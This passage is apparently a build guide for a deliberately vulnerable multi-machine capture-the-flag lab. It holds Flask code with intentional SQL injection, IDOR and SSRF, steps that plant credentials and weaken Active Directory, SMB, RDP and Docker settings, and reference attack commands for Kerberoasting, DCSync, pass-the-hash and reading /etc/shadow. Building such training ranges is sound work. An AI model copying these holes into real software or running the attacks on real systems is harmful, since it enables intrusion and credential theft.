<!DOCTYPE html><html><head><title>VPN Dashboard</title></head>
<body><h2>VPN Admin Dashboard</h2><h3>Available VPN Configs</h3><ul>
{% for config in configs %}
<li><a href="/download/{{ config }}">{{ config }}</a></li>
{% endfor %}
</ul></body></html>
EOF
```

### 8.4 Plant VPN Config Files (Credential Breadcrumbs)

```bash
sudo tee /etc/openvpn/clients/it-admin.ovpn << 'EOF'
client
dev tun
proto udp
remote vpn.vulncorp.local 1194
resolv-retry infinite
nobind
route 192.168.1.0 255.255.255.0
auth-user-pass
# Username: it-admin
# Password: ITAdmin@Vpn2024
EOF

sudo tee /etc/openvpn/clients/backup-agent.ovpn << 'EOF'
client
dev tun
proto udp
remote vpn.vulncorp.local 1194
auth-user-pass
# Username: backupadmin
# Password: backup123
route 192.168.1.50 255.255.255.255
EOF
```

### 8.5 Plant Leaked Log (Credential Exposure — intentional)

```bash
sudo mkdir -p /var/log/openvpn
sudo tee /var/log/openvpn/openvpn.log << 'EOF'
Mon Sep 01 08:16:01 2026 AUTH: username=john.doe password=Corp@Admin2024
Mon Sep 01 08:16:02 2026 AUTH: username=Administrator password=Corp@Admin2024
Mon Sep 01 08:30:00 2026 Client connected from 10.10.10.10 [sysadmin]
Mon Sep 01 09:00:00 2026 MANAGEMENT: password=admin123 accepted
EOF
```

### 8.6 Create Systemd Service

```bash
sudo tee /etc/systemd/system/vpn-admin.service << 'EOF'
[Unit]
Description=VulnCorp VPN Admin Panel
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/vpn_admin/app.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable vpn-admin ssh
sudo systemctl start vpn-admin
```

### 8.7 Plant Flags

```bash
echo "VULN{vpn_s3rv3r_r00t3d_m4ch1n3_5}" | sudo tee /root/root.txt
```

### 8.8 Test

```bash
curl http://172.16.0.20:8443/    # VPN admin login page
# Login with admin/admin → should succeed
# Test path traversal: /download/../../../etc/passwd
```

---

## 9. Machine 6 — rz-monitor01 (Monitoring Server)

**OS:** Debian 13 | **IP:** 172.16.0.30 | **Zone:** Restricted
**VirtualBox:** RAM 1024 MB · vCPUs 1 · Disk 20 GB · Adapter 1: `vboxnet1`

**Goal:** Nagios with default creds + SNMP public community string exposing full network topology.

### 9.1 Set Static IP

```
address 172.16.0.30
netmask 255.255.255.0
gateway 172.16.0.1
```

### 9.2 Install Services

```bash
sudo apt update
sudo apt install -y nagios4 nagios-plugins snmpd \
  apache2 php libapache2-mod-php openssh-server curl wget net-tools sudo
```

### 9.3 Set Nagios Default Password (nagiosadmin/nagios — intentional)

```bash
sudo htpasswd -c -b /etc/nagios4/htpasswd.users nagiosadmin nagios
sudo useradd -m monitor && echo "monitor:monitor123" | sudo chpasswd
```

### 9.4 Configure SNMP (Public Community — intentional)

```bash
sudo tee /etc/snmp/snmpd.conf << 'EOF'
# SNMP v1/v2c with community 'public' — intentional vulnerability
# Allows full MIB walk including ARP table, interfaces, routing table

rocommunity public 0.0.0.0/0
rwcommunity private 0.0.0.0/0

syslocation "VulnCorp Data Center, Server Room B"
syscontact sysadmin@vulncorp.local

view systemview included .1
EOF
```

### 9.5 Configure Nagios Hosts (Reveals Full Topology — intentional)

```bash
sudo tee /etc/nagios4/conf.d/hosts.cfg << 'EOF'
# VulnCorp Monitored Hosts — reveals full internal topology!

define host {
    host_name       rz-db01
    alias           Production Database
    address         172.16.0.10
    max_check_attempts 3
    check_period    24x7
    notification_period 24x7
}

define host {
    host_name       int-dc01
    alias           Domain Controller
    address         192.168.1.10
    max_check_attempts 3
    check_period    24x7
    notification_period 24x7
}

define host {
    host_name       int-erp01
    alias           ERP Server
    address         192.168.1.20
    max_check_attempts 3
    check_period    24x7
    notification_period 24x7
}

define host {
    host_name       int-files01
    alias           File Server
    address         192.168.1.40
    max_check_attempts 3
    check_period    24x7
    notification_period 24x7
}

define host {
    host_name       int-backup01
    alias           Backup Server
    address         192.168.1.50
    max_check_attempts 3
    check_period    24x7
    notification_period 24x7
}
EOF
```

### 9.6 Make Nagios Plugin Dir Writable (Privesc — intentional)

```bash
sudo chmod 777 /usr/lib/nagios/plugins/
```

### 9.7 Plant Flags

```bash
echo "VULN{n4g10s_d3f4ult}" | sudo tee /etc/nagios4/flag.txt
echo "VULN{snmp_c0mmun1ty_l34k}" | sudo tee /tmp/snmp_flag.txt
echo "VULN{m0n1t0r_r00t3d_m4ch1n3_6}" | sudo tee /root/root.txt
```

### 9.8 Enable All Services

```bash
sudo systemctl enable nagios4 snmpd apache2 ssh
sudo systemctl start nagios4 snmpd apache2 ssh
```

### 9.9 Test

```bash
# SNMP walk — reveals network topology
snmpwalk -v2c -c public 172.16.0.30 .1.3.6.1.2.1.1    # System info
snmpwalk -v2c -c public 172.16.0.30 .1.3.6.1.2.1.4    # IP routing

# Nagios web
curl -u nagiosadmin:nagios http://172.16.0.30/nagios4/
```

---

## 10. Machine 7 — int-dc01 (Domain Controller)

**OS:** Windows Server 2019 | **IP:** 192.168.1.10 | **Zone:** Internal
**VirtualBox:** RAM 4096 MB · vCPUs 2 · Disk 60 GB · Adapter 1: `vboxnet2`

**Goal:** Active Directory with AS-REP Roasting, Kerberoasting, DCSync, GPP cPassword, PrintNightmare, RDP without NLA.

### 10.1 Create the VM in VirtualBox

```
Name: VULNCORP-INT-DC01
Type: Microsoft Windows
Version: Windows 2019 (64-bit)
RAM: 4096 MB
vCPUs: 2
Disk: 60 GB (VDI, dynamically allocated)
Network Adapter 1: Host-only → vboxnet2
```

Attach the Windows Server 2019 ISO and boot.

### 10.2 Install Windows Server 2019

In the GUI installer:
1. Select **Windows Server 2019 Standard (Desktop Experience)**
2. Set Administrator password: `Corp@Admin2024`
3. After install, open Network Settings → set static IP:
   - IP: `192.168.1.10`
   - Subnet: `255.255.255.0`
   - Gateway: `192.168.1.1`
   - DNS: `127.0.0.1` (self, after AD install)

### 10.3 Promote to Domain Controller (PowerShell as Administrator)

```powershell
# Step 1: Install AD DS Role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Step 2: Promote to Domain Controller
Import-Module ADDSDeployment

Install-ADDSForest `
  -DomainName "vulncorp.local" `
  -DomainNetbiosName "VULNCORP" `
  -ForestMode "WinThreshold" `
  -DomainMode "WinThreshold" `
  -InstallDns:$true `
  -Force:$true `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "Corp@Admin2024" -AsPlainText -Force)

# Server will reboot — log back in after restart
```

### 10.4 Create Vulnerable AD Users (PowerShell)

```powershell
Import-Module ActiveDirectory

# Create Organizational Units
New-ADOrganizationalUnit -Name "VulnCorp Users" -Path "DC=vulncorp,DC=local"
New-ADOrganizationalUnit -Name "Service Accounts" -Path "DC=vulncorp,DC=local"

# Create users
$users = @(
  @{Name="John Doe";    SAM="john.doe";   Pass="Corp@Admin2024";   Desc="IT Admin"},
  @{Name="Jane Smith";  SAM="jane.smith"; Pass="Jane@Dev2024";     Desc="Developer"},
  @{Name="Help Desk";   SAM="helpdesk";   Pass="Helpdesk@123";     Desc="Help Desk"},
  @{Name="Backup Agent";SAM="svc_backup"; Pass="Backup@Svc2024";   Desc="Backup Service Account"},
  @{Name="ERP Service"; SAM="svc_erp";    Pass="Erp@Service99!";   Desc="ERP Application Service"},
  @{Name="SQL Service"; SAM="svc_sql";    Pass="Sql@Service77!";   Desc="SQL Server Service"}
)

foreach ($u in $users) {
  New-ADUser `
    -Name $u.Name `
    -SamAccountName $u.SAM `
    -UserPrincipalName "$($u.SAM)@vulncorp.local" `
    -AccountPassword (ConvertTo-SecureString $u.Pass -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true `
    -Description $u.Desc `
    -Path "OU=VulnCorp Users,DC=vulncorp,DC=local"
}

# Add john.doe to Domain Admins
Add-ADGroupMember -Identity "Domain Admins" -Members "john.doe"
```

### 10.5 Configure AD Vulnerabilities (PowerShell)

```powershell
# VULNERABILITY 1: AS-REP Roasting
Set-ADAccountControl -Identity "svc_backup" -DoesNotRequirePreAuth $true
Write-Host "[+] svc_backup is now AS-REP Roastable"

# VULNERABILITY 2: Kerberoasting — register SPNs on service accounts
Set-ADUser "svc_erp" -ServicePrincipalNames @{Add="HTTP/erp.vulncorp.local:80"}
Set-ADUser "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/sql.vulncorp.local:1433"}
Write-Host "[+] svc_erp and svc_sql are now Kerberoastable"

# VULNERABILITY 3: DCSync Rights for svc_backup
$acl = Get-Acl "AD:\DC=vulncorp,DC=local"
$identity = (Get-ADUser "svc_backup").SID
$adRights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type)
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\DC=vulncorp,DC=local" -AclObject $acl
Write-Host "[+] svc_backup has DCSync rights"

# VULNERABILITY 4: GPP cPassword in SYSVOL
$gppPath = "\\vulncorp.local\SYSVOL\vulncorp.local\Policies\{FAKE-GPP-POLICY}\Machine\Preferences\Groups"
New-Item -ItemType Directory -Force -Path $gppPath
Set-Content "$gppPath\Groups.xml" @'
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators">
    <Properties action="U" groupName="Administrators">
      <Members>
        <Member name="backdoor" action="ADD">
          <Properties cpassword="VZBQoGpDMEUESqPnEFTqMg==" userName="backdoor"/>
        </Member>
      </Members>
    </Properties>
  </Group>
</Groups>
'@
Write-Host "[+] GPP cPassword planted in SYSVOL"

# VULNERABILITY 5: Disable SMB Signing
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
Write-Host "[+] SMB Signing disabled — NTLM relay attacks possible"

# VULNERABILITY 6: GenericWrite ACL for svc_erp → Domain Admins
$sid = (Get-ADUser "svc_erp").SID
$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=vulncorp,DC=local"
$adRights = [System.DirectoryServices.ActiveDirectoryRights]"WriteProperty"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, $adRights, "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=Domain Admins,CN=Users,DC=vulncorp,DC=local" -AclObject $acl
Write-Host "[+] svc_erp has GenericWrite on Domain Admins"

# Plant flag files
New-Item C:\flags -ItemType Directory -Force
"VULN{gpp_p4ssw0rd_l34k}" | Set-Content C:\flags\gpp_flag.txt
"VULN{d0m41n_4dm1n_3mp1r3_f3ll}" | Set-Content C:\flags\domain_flag.txt
```

### 10.6 Enable PrintNightmare (CVE-2021-34527)

```powershell
# Keep Print Spooler running (default on Server 2019 — do NOT patch)
Get-Service -Name Spooler

# Enable remote print spooler
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print" `
  -Name "RpcAuthnLevelPrivacyEnabled" -Value 0
```

### 10.7 Enable RDP Without NLA (intentional)

```powershell
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
  -Name "fDenyTSConnections" -Value 0

# Disable Network Level Authentication (NLA) — intentional
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "UserAuthentication" -Value 0

# Allow through firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Write-Host "[+] RDP enabled without NLA on 192.168.1.10:3389"
```

### 10.8 Attacking This Machine (Reference)

```bash
# From Kali — enumerate
nmap -p 88,389,445,3389 192.168.1.10

# AS-REP Roasting
python3 GetNPUsers.py vulncorp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt

# Kerberoasting
python3 GetUserSPNs.py vulncorp.local/svc_backup:Backup@Svc2024 -dc-ip 192.168.1.10 -request
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# DCSync
python3 secretsdump.py vulncorp.local/svc_backup:Backup@Svc2024@192.168.1.10

# Pass the Hash
python3 wmiexec.py -hashes :NTLM_HASH Administrator@192.168.1.10

# BloodHound
bloodhound-python -u svc_backup -p Backup@Svc2024 -d vulncorp.local -ns 192.168.1.10 -c all
```

---

## 10b. Machine 12 — int-ws01 (Domain-Joined Workstation)

**OS:** Windows 10 Enterprise | **IP:** 192.168.1.60 | **Zone:** Internal  
**VirtualBox:** RAM 2048 MB · vCPUs 2 · Disk 40 GB · Adapter 1: `vboxnet2`

> ⚠️ **Deploy int-dc01 (section 10) FIRST.** The workstation joins `vulncorp.local` — the domain must exist before running this script.

**Goal:** Domain-joined Windows 10 endpoint simulating a real enterprise workstation. Entry point for AD-based attacks (EternalBlue, Kerberoasting, lateral movement to DC).

### 10b.1 Download Windows 10 ISO

| Resource | URL |
|----------|-----|
| Windows 10 Enterprise Eval (90-day free) | https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise |
| Windows 10 LTSC Eval (alternative) | https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise-ltsc |

### 10b.2 Create the VM in VirtualBox

```
Name:    VULNCORP-INT-WS01
Type:    Microsoft Windows
Version: Windows 10 (64-bit)
RAM:     2048 MB
vCPUs:   2
Disk:    40 GB (VDI, dynamically allocated)
Network Adapter 1: Host-only → vboxnet2
```

Attach the Windows 10 Enterprise ISO and boot.

### 10b.3 Install Windows 10

In the Windows installer:
1. Select **Windows 10 Enterprise**
2. Complete installation — create local user `labadmin` (temporary, will join domain)
3. After install, open **Control Panel → Network and Internet → Network Connections**
4. Set static IP on the Ethernet adapter:
   - IP Address: `192.168.1.60`
   - Subnet Mask: `255.255.255.0`
   - Default Gateway: `192.168.1.1`
   - DNS: **Leave blank** (script sets DNS to DC automatically)

### 10b.4 Deploy Vulnerabilities (PowerShell as Administrator)

Copy `deploy_ws.ps1` to the VM (USB, shared folder, or network share).

```powershell
# Step 1: Allow script execution
Set-ExecutionPolicy Bypass -Scope Process -Force

# Step 2: Run deployment
.\deploy_ws.ps1
```

The script will:
1. Set DNS to `192.168.1.10` (int-dc01)
2. Join domain `vulncorp.local` → **machine reboots**
3. After reboot — run `deploy_ws.ps1` again to complete vulnerability setup

### 10b.5 What deploy_ws.ps1 Configures (All Windows-Native Commands)

```powershell
# ── Domain Join ──────────────────────────────────────────────────────────────
# Sets DNS to DC, joins domain vulncorp.local using VULNCORP\Administrator creds
Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses "192.168.1.10"
Add-Computer -DomainName "vulncorp.local" -Credential $cred `
  -OUPath "OU=VulnCorp Users,DC=vulncorp,DC=local" -Force

# ── Vulnerabilities Configured ───────────────────────────────────────────────
# 1. EternalBlue: Enable SMBv1
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force

# 2. Disable SMB Signing (NTLM Relay)
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbClientConfiguration -RequireSecuritySignature $false -Force

# 3. PrintNightmare: Print Spooler running
Set-Service -Name Spooler -StartupType Automatic; Start-Service Spooler

# 4. Unquoted Service Path
sc.exe create "VulnCorpMonitor" binPath= `
  "C:\Program Files\VulnCorp\Monitoring Agent\monitor.exe" start= auto

# 5. AlwaysInstallElevated (MSI privesc)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
  -Name "AlwaysInstallElevated" -Value 1 -Type DWord
Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" `
  -Name "AlwaysInstallElevated" -Value 1 -Type DWord

# 6. RDP without NLA
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
  -Name "fDenyTSConnections" -Value 0
Set-ItemProperty `
  -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "UserAuthentication" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# 7. LLMNR / NetBIOS enabled
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" `
  -Name "EnableMulticast" -ErrorAction SilentlyContinue

# 8. Plant stored credentials, SMB share, flags
# → C:\Users\john.doe\Documents\saved_passwords.txt (Domain Admin creds!)
# → \\192.168.1.60\Public\IT_Notes.txt (DC password in plaintext)
# → C:\flags\*.txt

# 9. Disable Firewall & Defender (lab)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-MpPreference -DisableRealtimeMonitoring $true
```

### 10b.6 How int-ws01 Connects to int-dc01

```
int-ws01 (192.168.1.60)
    │
    ├─ DNS → 192.168.1.10 (DC resolves vulncorp.local)
    ├─ Kerberos :88 → DC issues TGTs for domain auth
    ├─ LDAP :389 → Group Policy, user info
    ├─ SMB :445 → NETLOGON + SYSVOL shares
    │
    └─ ATTACK PATH:
         john.doe:Corp@Admin2024 (stored on WS01) → DC RDP/SMB → Domain Admin
         svc_backup:Backup@Svc2024 (stored on WS01) → DC DCSync → Full domain dump
```

### 10b.7 Verification Commands (from Kali)

```bash
# Confirm workstation is reachable
nmap -p 445,3389,139 192.168.1.60

# EternalBlue check
nmap --script smb-vuln-ms17-010 192.168.1.60

# List SMB shares (guest access)
smbclient -L \\\\192.168.1.60 -N

# Grab stored credentials
smbclient \\\\192.168.1.60\\Public -N -c 'get IT_Notes.txt'

# Confirm domain join (from DC PowerShell)
Get-ADComputer -Filter {Name -eq "VULNCORP-WS01"}

# Confirm workstation connectivity to DC (from WS01 PowerShell)
nltest /sc_query:vulncorp.local
```

### 10b.8 Configured Vulnerabilities

| # | Vulnerability | CVE / CWE | Severity |
|---|---------------|-----------|----------|
| 1 | EternalBlue (SMBv1) | CVE-2017-0144 | 🔴 Critical |
| 2 | Stored plaintext credentials (john.doe) | CWE-256 | 🟠 High |
| 3 | PrintNightmare (Print Spooler) | CVE-2021-34527 | 🔴 Critical |
| 4 | Unquoted service path (VulnCorpMonitor) | CWE-428 | 🟠 High |
| 5 | AlwaysInstallElevated (MSI privesc) | CWE-269 | 🟠 High |
| 6 | LLMNR/NetBIOS poisoning | CWE-346 | 🟡 Medium |
| 7 | Weak local admin (ws_admin/Desktop@2024) | CWE-521 | 🟠 High |
| 8 | RDP without NLA | CWE-306 | 🟡 Medium |

### 10b.9 Flags

| Flag | Location |
|------|----------|
| `VULN{3t3rn4l_blu3_w0rkst4t10n}` | `C:\flags\eternalblue_flag.txt` |
| `VULN{st0r3d_cr3ds_p1vot}` | `C:\flags\creds_flag.txt` |
| `VULN{w0rkst4t10n_4dm1n_pwn3d}` | `C:\flags\admin_flag.txt` |

---

## 11. Machine 8 — int-erp01 (ERP Server)

**OS:** Ubuntu 24 | **IP:** 192.168.1.20 | **Zone:** Internal
**VirtualBox:** RAM 2048 MB · vCPUs 2 · Disk 25 GB · Adapter 1: `vboxnet2`

**Goal:** Custom Flask ERP with IDOR, SSRF, SQL injection, and business logic flaws.

### 11.1 Set Static IP (Netplan)

```yaml
addresses: [192.168.1.20/24]
routes:
  - to: default
    via: 192.168.1.1
```

### 11.2 Install Services

```bash
sudo apt update
sudo apt install -y python3 python3-pip postgresql postgresql-contrib \
  openssh-server curl wget net-tools sudo

pip3 install flask flask-sqlalchemy psycopg2-binary requests

sudo useradd -m erpuser && echo "erpuser:Erp@User2024" | sudo chpasswd
```

### 11.3 Set Up ERP Database

```bash
sudo -u postgres psql << 'EOF'
CREATE USER erp_admin WITH PASSWORD 'erp_admin123' SUPERUSER;
CREATE DATABASE erp_db OWNER erp_admin;
\c erp_db erp_admin

CREATE TABLE users (
  id SERIAL PRIMARY KEY, username VARCHAR(50),
  password VARCHAR(100), role VARCHAR(20), email VARCHAR(100)
);
INSERT INTO users VALUES
(1,'admin','admin123','admin','admin@vulncorp.local'),
(2,'john.doe','Corp@Admin2024','user','john.doe@vulncorp.local'),
(3,'jane.smith','Jane@Dev2024','developer','jane.smith@vulncorp.local'),
(4,'erpuser','Erp@User2024','user','erpuser@vulncorp.local');

CREATE TABLE employee_records (
  id SERIAL PRIMARY KEY, user_id INTEGER, full_name VARCHAR(100),
  salary DECIMAL(10,2), ssn VARCHAR(20), bank_account VARCHAR(30), address TEXT
);
INSERT INTO employee_records VALUES
(1,1,'Admin User',150000.00,'111-22-3333','VULNCORP-BANK-0001','Server Room, DC'),
(2,2,'John Doe',95000.00,'222-33-4444','VULNCORP-BANK-0002','123 IT Street'),
(3,3,'Jane Smith',88000.00,'333-44-5555','VULNCORP-BANK-0003','456 Dev Ave');

CREATE TABLE invoices (id SERIAL PRIMARY KEY, user_id INTEGER, amount DECIMAL(10,2), created_at TIMESTAMP DEFAULT NOW());

CREATE TABLE flags (id SERIAL PRIMARY KEY, flag_name VARCHAR(50), flag_value VARCHAR(100));
INSERT INTO flags VALUES
(1,'idor_flag','VULN{1d0r_3rp_r3c0rds}'),
(2,'ssrf_flag','VULN{ssrf_1nt3rn4l_s4n}'),
(3,'sqli_flag','VULN{sql1_erp_byp4ss}');
EOF
```

### 11.4 Deploy ERP Flask Application

```bash
sudo mkdir -p /opt/erp_app/templates

sudo tee /opt/erp_app/app.py << 'PYEOF'
from flask import Flask, request, render_template, redirect, session, jsonify
import psycopg2
import requests
import os

app = Flask(__name__)
app.secret_key = "erp_secret_hardcoded_2024"  # Hardcoded secret — intentional

DB_CONFIG = {
    'host': 'localhost',
    'database': 'erp_db',
    'user': 'erp_admin',
    'password': 'erp_admin123'
}

def get_db():
    return psycopg2.connect(**DB_CONFIG)

@app.route("/")
def index():
    return redirect("/erp/login")

@app.route("/erp/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username")
        p = request.form.get("password")
        conn = get_db()
        cur = conn.cursor()
        # SQL Injection vulnerability — intentional
        cur.execute(f"SELECT id, username, role FROM users WHERE username='{u}' AND password='{p}'")
        user = cur.fetchone()
        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['role'] = user[2]
            return redirect("/erp/dashboard")
        return render_template("login.html", error="Invalid credentials")
    return render_template("login.html")

@app.route("/erp/dashboard")
def dashboard():
    if 'user_id' not in session:
        return redirect("/erp/login")
    return render_template("dashboard.html", user=session['username'])

# VULNERABILITY: IDOR — Access any user's records by ID
@app.route("/erp/records")
def records():
    if 'user_id' not in session:
        return redirect("/erp/login")
    record_id = request.args.get("id", session['user_id'])
    # No authorization check — IDOR vulnerability!
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM employee_records WHERE user_id = %s", (record_id,))
    record = cur.fetchone()
    return render_template("records.html", record=record, flag="VULN{1d0r_3rp_r3c0rds}")

# VULNERABILITY: SSRF — Fetch internal URLs without validation
@app.route("/erp/import")
def import_doc():
    if 'user_id' not in session:
        return redirect("/erp/login")
    url = request.args.get("url", "")
    if url:
        try:
            # SSRF — no URL validation!
            # Attacker: /erp/import?url=http://192.168.1.50:873/
            # Or: /erp/import?url=file:///etc/passwd
            response = requests.get(url, timeout=5)
            return f"<pre>{response.text}</pre>"
        except Exception as e:
            return f"Error: {str(e)}"
    return render_template("import.html")

# VULNERABILITY: Business Logic — Negative invoice amount
@app.route("/erp/invoice/create", methods=["GET","POST"])
def create_invoice():
    if 'user_id' not in session:
        return redirect("/erp/login")
    if request.method == "POST":
        amount = float(request.form.get("amount", 0))
        # No validation that amount > 0 (business logic flaw)
        conn = get_db()
        cur = conn.cursor()
        cur.execute("INSERT INTO invoices (user_id, amount) VALUES (%s, %s)", (session['user_id'], amount))
        conn.commit()
        return f"Invoice created for amount: {amount}"
    return render_template("invoice.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
PYEOF
```

### 11.5 Create Systemd Service

```bash
sudo tee /etc/systemd/system/erp-app.service << 'EOF'
[Unit]
Description=VulnCorp ERP Application
After=network.target postgresql.service

[Service]
ExecStart=/usr/bin/python3 /opt/erp_app/app.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable erp-app postgresql ssh
sudo systemctl start erp-app
echo "VULN{erp_syst3m_pwn3d_m4ch1n3_8}" | sudo tee /root/root.txt
```

### 11.6 Test

```bash
curl "http://192.168.1.20/erp/records?id=1"
curl "http://192.168.1.20/erp/import?url=http://192.168.1.50:873/"
```

---

## 12. Machine 9 — int-dev01 (DevOps Server)

**OS:** Ubuntu 24 | **IP:** 192.168.1.30 | **Zone:** Internal
**VirtualBox:** RAM 3072 MB · vCPUs 2 · Disk 40 GB · Adapter 1: `vboxnet2`

**Goal:** GitLab (CVE-2021-22205) + Jenkins (no auth) + Docker API exposed without TLS.

### 12.1 Set Static IP (Netplan)

```yaml
addresses: [192.168.1.30/24]
routes:
  - to: default
    via: 192.168.1.1
```

### 12.2 Install Docker

```bash
sudo apt update
sudo apt install -y docker.io docker-compose-v2 openssh-server curl net-tools

sudo systemctl enable docker
sudo systemctl start docker
```

### 12.3 Expose Docker API Without TLS (intentional critical vuln)

```bash
sudo mkdir -p /etc/systemd/system/docker.service.d

sudo tee /etc/systemd/system/docker.service.d/override.conf << 'EOF'
[Service]
ExecStart=
ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375
EOF

sudo systemctl daemon-reload
sudo systemctl restart docker

# Test:
curl http://192.168.1.30:2375/version
```

### 12.4 Run Vulnerable GitLab (CVE-2021-22205)

```bash
sudo docker run -d \
  --name vulncorp-gitlab \
  --hostname vulncorp-gitlab \
  --restart always \
  -p 192.168.1.30:80:80 \
  -p 192.168.1.30:2222:22 \
  -e GITLAB_OMNIBUS_CONFIG="external_url 'http://192.168.1.30'; gitlab_rails['initial_root_password'] = 'gitlab_root_pass'" \
  -v gitlab_config:/etc/gitlab \
  -v gitlab_logs:/var/log/gitlab \
  -v gitlab_data:/var/opt/gitlab \
  gitlab/gitlab-ce:14.0.12-ce.0

# Wait ~3 minutes for initialization
sudo docker logs -f vulncorp-gitlab
```

### 12.5 Run Jenkins (No Auth — intentional)

```bash
sudo docker run -d \
  --name vulncorp-jenkins \
  --hostname vulncorp-jenkins \
  --restart always \
  -p 192.168.1.30:8080:8080 \
  -v jenkins_home:/var/jenkins_home \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --user root \
  -e JAVA_OPTS="-Djenkins.install.runSetupWizard=false" \
  jenkins/jenkins:2.387.1
```

### 12.6 Plant Secrets in GitLab

After GitLab is initialized, get a root access token and create a repo with leaked secrets:

```bash
# Get GitLab root token (from container logs or web UI)
GITLAB_TOKEN="your-root-token"

# Create repo and push .env with secrets (committed — intentional leak)
cat > /tmp/leaked.env << 'EOF'
# VulnCorp Infrastructure — DO NOT COMMIT
AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF
AWS_SECRET_ACCESS_KEY=super_secret_aws_key_dont_commit_this
DB_PASSWORD=Corp@Admin2024
REDIS_HOST=172.16.0.10
AD_ADMIN_PASSWORD=Corp@Admin2024
SLACK_WEBHOOK=https://hooks.slack.com/services/fake/webhook
EOF
```

### 12.7 Jenkins Security Disable Script

```bash
sudo docker exec -it vulncorp-jenkins bash -c "
cat > /var/jenkins_home/init.groovy.d/disable-security.groovy << 'EOF'
import jenkins.model.*
import hudson.security.*
def instance = Jenkins.getInstance()
def strategy = new AuthorizationStrategy.Unsecured()
instance.setAuthorizationStrategy(strategy)
instance.save()
println \"[+] Jenkins security disabled!\"
EOF"
```

### 12.8 Plant Flags

```bash
echo "VULN{d0ck3r_api_rce}" | sudo tee /root/root.txt
echo "VULN{d3v0ps_s3cr3ts_l3ak3d}" | sudo tee /opt/dev_flag.txt
```

### 12.9 Test

```bash
# Docker API — no TLS, no auth
curl http://192.168.1.30:2375/version
curl http://192.168.1.30:2375/containers/json

# Docker API RCE — mount host filesystem
docker -H tcp://192.168.1.30:2375 run -v /:/host --rm alpine cat /host/etc/shadow

# Jenkins script console (no auth)
curl http://192.168.1.30:8080/script
```

---

## 13. Machine 10 — int-files01 (File Server)

**OS:** Debian 13 | **IP:** 192.168.1.40 | **Zone:** Internal
**VirtualBox:** RAM 1024 MB · vCPUs 1 · Disk 20 GB · Adapter 1: `vboxnet2`

**Goal:** Samba with SMBv1 (EternalBlue) + NFS with no_root_squash + open shares with credential files.

### 13.1 Set Static IP

```
address 192.168.1.40
netmask 255.255.255.0
gateway 192.168.1.1
```

### 13.2 Install Services

```bash
sudo apt update
sudo apt install -y samba samba-common nfs-kernel-server nfs-common \
  openssh-server curl wget net-tools sudo python3

sudo useradd -m fileuser && echo "fileuser:File@User2024" | sudo chpasswd
sudo useradd -m hruser && echo "hruser:HR@User2024" | sudo chpasswd
```

### 13.3 Plant Files in Shares

```bash
sudo mkdir -p /srv/shares/{IT_Share,HR,SSH_Keys,backup_scripts}
sudo chmod -R 777 /srv/shares/

# Backup script with hardcoded database credentials (breadcrumb)
sudo tee /srv/shares/backup_scripts/backup_db.sh << 'EOF'
#!/bin/bash
# Automated database backup — credentials hardcoded (intentional)
MYSQL_HOST="172.16.0.10"
MYSQL_USER="root"
MYSQL_PASS="toor"
MSSQL_HOST="192.168.1.20"
MSSQL_USER="sa"
MSSQL_PASS="sa"
BACKUP_DIR="/backups/db"

mysqldump -h $MYSQL_HOST -u $MYSQL_USER -p$MYSQL_PASS --all-databases > $BACKUP_DIR/mysql_backup.sql
rsync -avz $BACKUP_DIR/ backupadmin@192.168.1.50:/backups/db-backup/ --password-file=/etc/rsync.pass
EOF

# Password hint in README
